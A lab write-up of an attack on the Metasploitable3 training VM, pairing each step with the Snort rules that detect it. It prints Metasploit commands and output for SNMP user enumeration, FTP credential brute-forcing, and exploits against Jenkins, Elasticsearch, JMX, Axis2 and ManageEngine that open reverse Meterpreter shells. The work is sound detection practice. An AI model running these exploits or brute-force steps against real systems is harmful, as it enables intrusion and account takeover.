# Is it easier to fix the application than to detect attacks?
* It is obviously best not to have any exploitable vulnerabilities at all. Then again vulnerabilities are always unknown at first so having intrusion detection and to verify the system integrity is at least some kind of countermeasure, especially if the detecting NIDS/HIDS can actively block traffic besides producing alerts.
* The possibility of fixing applications depends together with other factors for example on whether the software is open source or proprietary and if it is actively maintained or not. A common scenario is old proprietary software which only works on older systems leading to unpatched systems running with known vulnerabilities.
In the case of systems based solely on open source I would argue that it is always easier to fix the application but to become aware of vulnerabilities that needs to be fixed analysing anomalies in systems and network traffic is a great help.
# 1. Portscan of Metasploitable3
* The system was set up and snort installed in the virtual machine with the snapshot-2990 and community rule sets. Custom nonstandard HTTP ports like 8484 was added to HTTP_PORTS, http_inspect_server and the stream5_tcp preprocessor in snort.conf as they were not included by default.
 - `$ nmap -sS -p 1-65535 -T4 -v 192.168.78.2`
* Initial TCP SYN port scan showed 17 open ports:
 - `$ nmap -sV -p 21,22,80,1617,3000,4848,5985,8022,8080,8282,8484,\
  8585,9200,49153,49154,49202,49203 -v 192.168.78.2`
~~~javascript
* PORT      STATE SERVICE       VERSION
* 21/tcp    open  ftp           Microsoft ftpd
* 22/tcp    open  ssh           OpenSSH 7.1 (protocol 2.0)
* 80/tcp    open  http          Microsoft IIS httpd 7.5
* 1617/tcp  open  nimrod-agent?
* 3000/tcp  open  http          WEBrick httpd 1.3.1 (Ruby 2.3.1 (2016-04-26))
* 4848/tcp  open  ssl/http      Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
* 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
* 8022/tcp  open  http          Apache Tomcat/Coyote JSP engine 1.1
* 8080/tcp  open  http          Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
* 8282/tcp  open  http          Apache Tomcat/Coyote JSP engine 1.1
* 8484/tcp  open  http          Jetty winstone-2.8
* 8585/tcp  open  http          Apache httpd 2.2.21 ((Win64) PHP/5.3.10 DAV/2)
* 9200/tcp  open  http          Elasticsearch REST API 1.1.1 (name: Mandroid; Lucene 4.7)
* 49153/tcp open  msrpc         Microsoft Windows RPC
* 49154/tcp open  msrpc         Microsoft Windows RPC
* 49202/tcp open  unknown
* 49203/tcp open  tcpwrapped
* Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
* Slow comprehensive nmapscan additionally revealed:
* 161/udp   open  snmp     SNMPv1 server (public)
~~~
* Snort produced no alerts for any of the scans even when enabling sfportscan preprocessor in snort.conf and indicator-scan.rules:28. There are nmap-specific rules in deleted.rules but I decided to move on.
# 2. Gathering information using SNMP
2.1 msfconsole
* ` msf > use auxiliary/scanner/snmp/snmp_enum `
* ` msf auxiliary(snmp_enum) > set RHOSTS 192.168.78.2 `
* ` msf auxiliary(snmp_enum) > exploit `
 ...
*  [*] System information:
* Host IP                       : 192.168.78.2
* Hostname                      : metasploitable3
* ...
* The snmp-scanner found 20 user accounts:
* •	Administrator, Guest, anakin_skywalker, artoo_detoo, ben_kenobi, boba_fett, c_three_pio, chewbacca, darth_vader, greedo, han_solo, jabba_hutt, jarjar_binks, kylo_ren, lando_calrissian, leah_organa, luke_skywalker, sshd, sshd_server, vagrant
* 2.2 snort
* A walk of the public snmp MIB was not detected by snort. Enabling rules in protocol-snmp.rules produced:
* PROTOCOL-SNMP public access udp [**] [Classification: Attempted Information Leak]
* PROTOCOL-SNMP request udp [**] [Classification: Attempted Information Leak]
# 3. Bruteforcing FTP
  3.1 msfconsole
* Known usernames were added to users.txt.
* ` msf > use auxiliary/scanner/ftp/ftp_login`
* ` msf auxiliary(ftp_login) > set RHOSTS 192.168.78.2`
* ` msf auxiliary(ftp_login) > set USER_FILE users.txt`
* ` msf auxiliary(ftp_login) > set PASS_FILE /opt/metasploit/data/wordlists/unix_passwords.txt`
* ` msf auxiliary(ftp_login) > set USER_AS_PASS true`
* ` msf auxiliary(ftp_login) > exploit`
 ...
* [+] 192.168.78.2:21       - 192.168.78.2:21 - LOGIN SUCCESSFUL: Administrator:vagrant
* [+] 192.168.78.2:21       - 192.168.78.2:21 - LOGIN SUCCESSFUL: vagrant:vagrant
* Detected credentials can be used in terminal-logins and for services like FTP, SSH, and others.
* 3.2 snort
* Snort does not detecting bruteforcing of FTP other than monitoring rate of logins and that could be avoided by limiting the attack rate.
# 4. Exploiting Jenkins
 4.1 msfconsole
* ` msf > use exploits/multi/http/jenkins_script_console`
* `  msf exploit(jenkins_script_console) > set RHOST 192.168.78.2`
* ` msf exploit(jenkins_script_console) > set RPORT 8484`
* ` msf exploit(jenkins_script_console) > set TARGETURI /`
* ` msf exploit(jenkins_script_console) > exploit`
 ...
* [*] Sending stage (957487 bytes) to 192.168.78.2
* [*] Command Stager progress - 100.00% done (99626/99626 bytes)
* [*] Meterpreter session 1 opened (172.28.128.1:4444 -> 192.168.78.2:49644) at 2017-04-09 18:04:14 +0300

* ` meterpreter > getuid`
* Server username: NT AUTHORITY\LOCAL SERVICE
 4.2 snort
* Enabling app-detect.rules:172, server-other.rules:1436 and changing the URI from "/jenkins/" to "/" produced:
* APP-DETECT Jenkins Groovy script access through script console attempt [**] [Classification: Potential Corporate Privacy Violation]
# 5. Exploiting Elasticsearch (CVE-2014-3120)
5.1 msfconsole
* ` msf > use exploit/multi/elasticsearch/script_mvel_rce`
* ` msf exploit(script_mvel_rce) > set RHOST 192.168.78.2`
* ` msf exploit(script_mvel_rce) > exploit`
...
* [*] Trying to execute arbitrary Java...
* [*] Discovering remote OS...
* [+] Remote OS is 'Windows Server 2008 R2'
* [*] Discovering TEMP path
* [+] TEMP path identified: 'C:\Windows\TEMP\'
* [*] Sending stage (49667 bytes) to 192.168.78.2
* [*] Meterpreter session 3 opened (172.28.128.1:4444 -> 192.168.78.2:56198) at 2017-04-09 00:01:45 +0300
* [!] This exploit may require manual cleanup of 'C:\Windows\TEMP\GgOFe.jar' on the target

*` meterpreter > getuid`
* Server username: METASPLOITABLE3$
5.2 snort
* Enabling server-other.rules:812,1336 produces:
* SERVER-OTHER ElasticSearch script remote code execution attempt [**] [Classification: Attempted User Privilege Gain]
# 6. Exploiting JMX (CVE-2015-2342)
 6.1 msfconsole
* `msf > use exploit/multi/misc/java_jmx_server`
* ` msf exploit(java_jmx_server) > set RHOST 192.168.78.2`
* ` msf exploit(java_jmx_server) > set RPORT 1617`
* ` msf exploit(java_jmx_server) > exploit`
...
* [+] 192.168.78.2:1617 - Handshake with JMX MBean server on 192.168.78.2:49202
* [*] 192.168.78.2:1617 - Loading payload...
* [*] 192.168.78.2:1617 - Replied to request for mlet
* [*] 192.168.78.2:1617 - Executing payload...
* [*] Sending stage (49667 bytes) to 192.168.78.2
* [*] Meterpreter session 1 opened (172.28.128.1:4444 -> 192.168.78.2:55207) at 2017-04-08 22:41:42 +0300

* meterpreter > getuid
* Server username: LOCAL SERVICE
6.2 snort
* Enabling server-other.rules:177,1346 produces:
* SERVER-OTHER Oracle Java JMX server insecure configuration remote code execution attempt [**] [Classification: Attempted User Privilege Gain]
# 7. Exploiting Apache Axis2 (CVE-2010-0219)
7.1 msfconsole
* Default payload did not work but adjusting target and payload gained a meterpreter prompt.
* `msf > use exploit/multi/http/axis2_deployer`
* ` msf exploit(axis2_deployer) > set RHOST 192.168.78.2`
* ` msf exploit(axis2_deployer) > set LHOST 172.28.128.1`
* ` msf exploit(axis2_deployer) > set RPORT 8282`
* ` msf exploit(axis2_deployer) > set target 1`
* ` msf exploit(axis2_deployer) > set payload java/meterpreter/reverse_tcp`
* ` msf exploit(axis2_deployer) > exploit`

* [*] Started reverse TCP handler on 172.28.128.1:4444
* [+] http://192.168.78.2:8282/axis2/axis2-admin [Apache-Coyote/1.1] [Axis2 Web Admin Module] successful login 'admin' : 'axis2'
* [*] Successfully uploaded
* [*] Polling to see if the service is ready
* [*] Sending stage (49667 bytes) to 192.168.78.2
* [*] Meterpreter session 10 opened (172.28.128.1:4444 -> 192.168.78.2:52402) at 2017-04-09 21:47:02 +0300
* [+] Deleted webapps/axis2/WEB-INF/services/ekQcQZls.jar

* ` meterpreter > getuid`
* Server username: METASPLOITABLE3$
7.2 snort
* Enabling server-other.rules:1451 and policy-other.rules:84,115-116
* POLICY-OTHER HP Universal CMDB default credentials authentication attempt [**] [Classification: Potential Corporate Privacy Violation]
* POLICY-OTHER CA ARCserve Axis2 default credential login attempt [**] [Classification: Attempt to Login By a Default Username and * Password]
* POLICY-OTHER HP Universal CMDB server axis2 service upload attempt [**] [Classification: Attempted Administrator Privilege Gain]
# 8. Exploiting ManageEngine (CVE-2015-8249)
8.1 msfconsole
* ` msf > use exploit/windows/http/manageengine_connectionid_write `
* ` msf exploit(manageengine_connectionid_write) > set RHOST 192.168.78.2 `
* ` msf exploit(manageengine_connectionid_write) > set RPORT 8022 `
* ` msf exploit(manageengine_connectionid_write) > exploit `

* [*] Started reverse TCP handler on 172.28.128.1:4444
* [*] Creating JSP stager
* [*] Uploading JSP stager vSkNT.jsp...
* [*] Executing stager...
* [*] Sending stage (957487 bytes) to 192.168.78.2
* [*] Meterpreter session 3 opened (172.28.128.1:4444 -> 192.168.78.2:53235) at 2017-04-09 22:34:31 +0300
* [+] Deleted ../webapps/DesktopCentral/jspf/vSkNT.jsp

* ` meterpreter > getuid`
* Server username: NT AUTHORITY\LOCAL SERVICE
8.2 snort
* Enabling rules/server-webapp.rules:1853-1855
* SERVER-WEBAPP ManageEngine Desktop Central FileUploadServlet directory traversal attempt [**] [Classification: Web Application Attack]

